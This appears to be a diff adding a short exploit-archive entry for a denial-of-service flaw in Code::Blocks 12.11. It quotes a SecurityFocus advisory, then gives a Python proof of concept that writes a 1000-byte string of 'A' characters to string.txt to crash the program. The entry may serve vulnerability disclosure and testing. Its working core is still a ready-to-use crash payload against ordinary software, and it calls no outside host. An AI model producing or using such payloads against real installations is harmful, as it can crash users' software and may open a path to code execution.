@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/60208/info
+
+Code::Blocks is prone to a denial-of-service vulnerability.
+
+An attacker can exploit this issue to cause an affected application to crash, denying service to legitimate users. Due to the nature of this issue, arbitrary code execution may be possible, but this has not been confirmed.
+
+Code::Blocks 12.11 is vulnerable; other versions may also be affected. 
+
+#!/usr/bin/python
+ 
+filename="string.txt"
+buffer = "\x41" * 1000
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
+
